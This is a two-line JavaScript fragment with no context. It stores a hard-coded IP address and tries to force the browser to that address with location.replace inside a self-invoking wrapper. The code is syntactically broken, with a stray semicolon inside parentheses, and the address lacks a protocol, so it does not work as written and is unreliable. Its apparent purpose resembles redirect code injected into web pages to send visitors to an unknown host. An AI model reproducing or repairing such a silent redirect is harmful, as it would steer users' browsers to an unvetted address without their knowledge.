var ip = "145.14.21.172";
(location.replace (ip);)();